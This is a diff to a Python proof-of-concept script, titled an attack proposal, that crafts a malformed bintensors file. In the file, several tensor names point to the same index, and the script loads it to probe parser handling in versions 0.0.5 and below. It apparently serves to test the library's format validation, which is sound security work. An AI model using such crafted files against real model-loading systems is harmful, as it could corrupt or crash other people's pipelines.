@@ -1,6 +1,7 @@
 # Safetensors attack proposal #4
 import os
-from bintensors.torch import load_file
+import torch 
+from bintensors.torch import load_file, load, save
 from typing import List, Dict
 from itertools import chain
 
@@ -48,7 +49,7 @@ def encode_tensor_info(dtype: str, shape: Tuple[int, ...], offset: Tuple[int, in
     return b"".join(list(map(encode_unsigned_variant_encoding, layout)))
 
 
-def encode_hash_map(index_map: Dict[str, int]) -> List[bytes]:
+def custom_encode_hash_map(index_map: Dict[str, int]) -> List[bytes]:
     """Encodes a dictionary of string keys and integer values."""
     length = encode_unsigned_variant_encoding(len(index_map))
 
@@ -56,37 +57,40 @@ def encode_hash_map(index_map: Dict[str, int]) -> List[bytes]:
         (
             encode_unsigned_variant_encoding(len(k)),
             k.encode("utf-8"),
-            encode_unsigned_variant_encoding(v),
+            encode_unsigned_variant_encoding(0), # payload
         )
         for k, v in index_map.items()
     )
 
     return b"".join(chain([length], hash_map_layout))
 
-filename = "bintensors_abuse_attempt_4.bt"
+filename = "bintensors_abuse_attempt_5.bt"
 
 
 def create_payload(size: int):
     """Generates a binary payload with tensor metadata and hash map layout."""
-    assert size > 1, "Size must be greater then 1 for this payload function to work"
-    shape = (2, 2)
-    tensor_chunk_length = shape[0] * shape[1] * 4  # Size of a tensor buffer
+    shape = [(1, 1), (2, 2)]
 
-    length = encode_unsigned_variant_encoding(size - 1)
+    length = encode_unsigned_variant_encoding(size)
 
     # Create tensor info buffer
     tensor_info_buffer = b"".join(
-        encode_tensor_info(
+        [encode_tensor_info(
             "F32",
-            shape,
-            (i * tensor_chunk_length, i * tensor_chunk_length + tensor_chunk_length),
-        )
-        for i in range(size - 1)
+            (1, 1),
+            (0, 4),
+        ),
+         encode_tensor_info(
+            "F32",
+            (2, 2),
+            (4, 20),
+        )]
     )
+
     layout_tensor_info = length + tensor_info_buffer
 
-    # Create hash map layout
-    hash_map_layout = encode_hash_map({f"weight_{i}": i for i in range(size)})
+    # Create index_map { "weight_0" : 0, "weight_1" : 0 } same index
+    hash_map_layout = custom_encode_hash_map({f"weight_{i}": i for i in range(size)})
 
     # Construct full layout
     layout = b"\0" + layout_tensor_info + hash_map_layout
@@ -98,16 +102,22 @@ def create_payload(size: int):
     with open(filename, "wb") as f:
         f.write(n_header)
         f.write(layout)
-        f.write(b"\0" * (tensor_chunk_length * size))
+        f.write(b"\0" * 20)
 
     print(f"Payload written to {filename}")
+    return n_header + layout + (b"\0" * 20)
 
 
 if __name__ == "__main__":
     import warnings
     import bintensors
+    
+    
     if bintensors.__version__ <= "0.0.5":
         warnings.warn("This attack will be depricated within the release version of bintensors, and only applies 0.0.5 and below.")
         create_payload(2)
         print(f"The file {filename} is {os.path.getsize(filename) / 10_000_00} Mb")
-        print(load_file(filename))
+        buffer = load_file(filename)
+        print(buffer)
+
+        
